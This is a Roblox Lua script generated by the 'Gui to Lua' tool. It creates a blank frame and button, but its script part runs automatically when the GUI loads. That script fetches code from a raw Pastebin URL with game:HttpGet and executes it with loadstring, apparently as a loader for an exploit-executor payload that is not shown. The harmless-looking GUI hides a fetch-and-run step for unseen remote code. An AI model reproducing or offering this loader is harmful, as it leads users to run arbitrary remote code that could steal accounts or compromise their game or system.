-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Workspace
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.354545474, 0, 0.439809293, 0)
Frame.Size = UDim2.new(0, 632, 0, 100)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0, 0, 0.25, 0)
TextButton.Size = UDim2.new(0, 632, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

-- Scripts:

local function VTESWL_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	loadstring(game:HttpGet("https://pastebin.com/raw/YHd39n6u"))()
end
coroutine.wrap(VTESWL_fake_script)()
